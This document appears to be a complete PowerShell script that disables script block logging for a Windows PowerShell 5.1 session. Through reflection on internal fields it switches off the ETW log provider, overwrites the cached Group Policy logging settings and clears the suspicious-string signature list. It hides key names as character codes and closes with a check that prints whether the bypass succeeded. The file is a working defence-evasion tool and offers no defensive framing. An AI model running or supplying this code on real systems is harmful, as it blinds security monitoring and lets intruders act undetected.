# ============================================================================
#  ScriptBlock Logging Bypass — Windows PowerShell 5.1 (FINAL)
#  In-memory, session-scoped. No admin, no registry writes, no disk artifacts.
# ============================================================================

function Decode-Str([int[]]$codes) { -join [char[]]$codes }

$asm = [System.Management.Automation.PSObject].Assembly
$bf  = [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static

$u   = 'System.Management.Automation.' + (Decode-Str 85,116,105,108,115)
$cgp = Decode-Str 99,97,99,104,101,100,71,114,111,117,112,80,111,108,105,99,121,83,101,116,116,105,110,103,115
$sbl = Decode-Str 83,99,114,105,112,116,66,108,111,99,107,76,111,103,103,105,110,103
$esb = Decode-Str 69,110,97,98,108,101,83,99,114,105,112,116,66,108,111,99,107,76,111,103,103,105,110,103
$eib = Decode-Str 69,110,97,98,108,101,83,99,114,105,112,116,66,108,111,99,107,73,110,118,111,99,97,116,105,111,110,76,111,103,103,105,110,103
$sg  = Decode-Str 115,105,103,110,97,116,117,114,101,115
$sb  = 'System.Management.Automation.' + (Decode-Str 83,99,114,105,112,116,66,108,111,99,107)

# ---- STAGE 1: ETW provider kill
try {
    $etw = $asm.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider',$bf).GetValue($null)
    $etwField = $etw.GetType().GetField('m_enabled','NonPublic,Instance')
    $etwField.SetValue($etw,0)
    $etwState = $etwField.GetValue($etw)
} catch { $etwState = $null }

# ---- STAGE 2: cached GPO tamper (short key AND full path key — covers both code paths)
$cache = $asm.GetType($u).GetField($cgp,$bf).GetValue($null)
$d = [System.Collections.Generic.Dictionary[string,object]]::new()
$d.Add($esb,[int]0); $d.Add($eib,[int]0)
$cache[$sbl] = $d
$cache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\' + $sbl] = $d

# ---- STAGE 3: empty the suspicious-signatures set
$asm.GetType($sb).GetField($sg,$bf).SetValue($null,[System.Collections.Generic.HashSet[string]]::new())

# ---- VERIFICATION
$ok  = @(); $bad = @(); $skip = @()

if ($etwState -eq 0) { $ok += 'ETW provider disabled (m_enabled = 0)' } else { $bad += 'ETW provider still enabled' }

$c = $asm.GetType($u).GetField($cgp,$bf).GetValue($null)
if ($c[$sbl][$esb] -eq 0) { $ok += ("cached {0} = 0" -f $esb) } else { $bad += ("cached {0} != 0" -f $esb) }
if ($c[$sbl][$eib] -eq 0) { $ok += ("cached {0} = 0" -f $eib) } else { $bad += ("cached {0} != 0" -f $eib) }

# Compile-time lookup proof — resolved by EXACT parameter types (deterministic)
$gps = $asm.GetType($u).GetMethod('GetGroupPolicySetting',$bf,$null,[Type[]]@([string],[string]),$null)
if ($gps) {
    $r1 = $gps.Invoke($null,@($sbl,$esb))
    $r2 = $gps.Invoke($null,@($sbl,$eib))
    if ($r1 -eq 0) { $ok += ("GetGroupPolicySetting({0}) = 0" -f $esb) } else { $bad += ("lookup {0} = {1}" -f $esb,$r1) }
    if ($r2 -eq 0) { $ok += ("GetGroupPolicySetting({0}) = 0" -f $eib) } else { $bad += ("lookup {0} = {1}" -f $eib,$r2) }
} else { $skip += 'compile-time lookup check skipped (string overload not present on this build)' }

$cnt = $asm.GetType($sb).GetField($sg,$bf).GetValue($null).Count
if ($cnt -eq 0) { $ok += 'suspicious-string set empty (count = 0)' } else { $bad += "suspicious-string count = $cnt" }

Write-Host ''
Write-Host '=== ScriptBlock Logging bypass verification ==='
$ok  | ForEach-Object { Write-Host ('  [PASS] ' + $_) -ForegroundColor Green }
$bad | ForEach-Object { Write-Host ('  [FAIL] ' + $_) -ForegroundColor Red }
$skip| ForEach-Object { Write-Host ('  [SKIP] ' + $_) -ForegroundColor Yellow }
Write-Host ''
if ($bad.Count -eq 0) {
    Write-Host '[+] RESULT: SUCCESS — script block logging disabled for this session.' -ForegroundColor Green
} else {
    Write-Host '[-] RESULT: FAILED — review the FAIL lines above.' -ForegroundColor Red
}